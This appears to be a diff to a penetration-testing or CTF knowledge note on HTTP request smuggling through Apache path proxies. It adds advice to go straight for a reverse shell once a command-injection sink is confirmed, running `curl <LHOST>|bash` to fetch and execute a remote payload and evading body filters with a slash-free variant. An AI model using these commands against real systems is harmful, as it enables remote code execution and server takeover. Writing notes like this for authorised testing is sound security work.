@@ -526,6 +526,8 @@ Byte-level gotchas (each costs hours if wrong):
 
 Detect: backend `Server:` header differs from the front, a `/page/`-style path-proxy, Apache 2.4.x at or below 2.4.55. Fuzz the proxied prefix (`ffuf -u .../page/FUZZ -e .php -fw <readfile-error-wordcount>`) to find the unrouted sink before smuggling. See [[reverse-proxy-attacks]], [[path-traversal-lfi]], [[os-command-injection]].
 
+**Efficiency once a sink is confirmed: go straight for a reverse shell, don't build the slow blind chain first.** The moment ANY command-injection sink reached via smuggling (or any other desync-delivered primitive) is confirmed, try `curl <LHOST>|bash` immediately rather than defaulting to a blind write-to-file + LFI-read-back loop — the blind chain is a fallback for when egress is actually blocked, not the default path. Sidestep body-encoding limits (a front that 404s a literal `/` in the body, or double-encoding requirements for slashes) by hosting the payload at web-root `index.html` and injecting a slash-free `curl <IP>|bash`: no LFI double-encoding, no chunked multi-request race, one short body.
+
 ---
 
 ## Detection and Defence
